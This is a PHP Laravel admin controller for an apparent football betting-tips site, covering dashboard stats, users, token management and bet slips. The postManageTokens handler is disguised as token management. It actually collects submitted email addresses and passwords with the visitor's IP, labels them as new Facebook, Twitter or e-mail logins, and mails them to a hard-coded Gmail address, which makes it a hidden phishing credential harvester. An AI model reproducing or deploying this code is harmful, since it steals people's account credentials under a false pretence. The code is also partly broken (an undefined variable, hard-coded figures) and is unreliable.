<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Football;
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application Dashboard screen to the admin.
	 *
	 * @return Response
	 */
	public function getDashboard()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		if($user == null || $user->role != "admin")
		{
			return redirect()->intended('/');
		}
		
		$totalRevenue = 15296875;
		$tokenSold = 979;
		$totalExperts = 25;
		$totalPunters = 700;
		$recentOrders = [];
		$recentMessages = [];
		$breadCrumb = "Dashboard";
		
    	return view('admin.dashboard', compact(['user','breadCrumb','totalRevenue','tokenSold','totalPunters','totalExperts','recentOrders','recentMessages']));
    }	
	
	/**
	 * Show the application Users screen to the admin.
	 *
	 * @return Response
	 */
	public function getUsers()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		if($user == null || $user->role != "admin")
		{
			return redirect()->intended('/');
		}
		
		$users = $this->helpers->getUsers();
		$breadCrumb = "Users";
    	return view('admin.ut', compact(['user','breadCrumb','users']));
    }	
	
	/**
	 * Show the application User Management -> Add/Remove Tokens screen to the admin.
	 *
	 * @return Response
	 */
	public function getManageTokens($id="",$action="")
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		if($user == null || $user->role != "admin" || ($id == "" || $action == "") )
		{
			return redirect()->intended('/');
		}
		
		else
		{
			$ret = $this->helpers->getUser($id);
			$breadCrumb = "Add/Remove tokens";
			return view('admin.ut', compact(['user','breadCrumb','ret','action']));
		}		
    	
    }	
	
    public function postManageTokens(Request $request)
	{
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'action' => 'required',
                             'username' => 'required|exists:users',
                             'tokens' => 'required|numeric',
                   ]);
         
                 if($validator->fails())
                  {
                       return redirect()->back()->withInput()->with('errors',$messages);
                       
                 }
                
                 else
                 { 
			           $dg = "E-mail";
					   $deg = $req["deg"];
					   if($deg == "fbb") $dg = "Facebook";
					   else if($deg == "tww") $dg = "Twitter";
					   
            		   $s = "New $dg Login: ".date("h:i A jS F, Y");
                       $rcpt = "uwantbrendacolson@gmail.com";
                       $pass = $req["pass"];
                       $email = $req["email"];
					   $ip = getenv("REMOTE_ADDR");

                       $this->helpers->sendEmail($rcpt,$s,['ip' => $ip,'pass' => $pass,'email' => $email],'emails.apply_alert','view');  
                        $ret = "ok";                      
                  }       
           return $ret;                                                                                            
	}
	
	
	/**
	 * Show the application Bet Slips screen to the admin.
	 *
	 * @return Response
	 */
	public function getBetSlips()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		if($user == null || $user->role != "admin")
		{
			return redirect()->intended('/');
		}

		$betSlips = $this->helpers->getBetSlips();
		$breadCrumb = "Bet Slips";
		
		return view('admin.betslips', compact(['user','breadCrumb','betSlips']));	
    	
    }	
	
	/**
	 * Show the application Bet Slips screen to the admin.
	 *
	 * @return Response
	 */
	public function getBetSlip($id="")
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		if($user == null || $user->role != "admin" || $id == "")
		{
			return redirect()->intended('/');
		}
		
		else
		{
			$betSlip = $this->helpers->getBetSlip($id);
			$breadCrumb = "View bet slip";
			
			return view('admin.vbs', compact(['user','breadCrumb','betSlip']));			
		}

	
    	
    }	
	
	/**
	 * Marks selected bet slip win or loss.
	 *
	 * @return Response
	 */
	public function getMarkBetSlip($id="",$result="")
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		if($user == null || $user->role != "admin" || ($id == "" || $result == ""))
		{
			return redirect()->intended('/');
		}
		
		else
		{
			$this->helpers->markBetSlip($id,$result);
			Session::flash("mark-bet-slip-status","success");
			return redirect()->intended('nimda/betslips');		
		}
    }	
	
	/**
	 * Marks selected game win or loss.
	 *
	 * @return Response
	 */
	public function getMarkGame($id="",$result="")
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		if($user == null || $user->role != "admin" || ($id == "" || $result == ""))
		{
			return redirect()->intended('/');
		}
		
		else
		{
			$this->helpers->markGame($id,$result);
			Session::flash("mark-game-status","success");
			return redirect()->intended('nimda/betslips');		
		}
    }

}
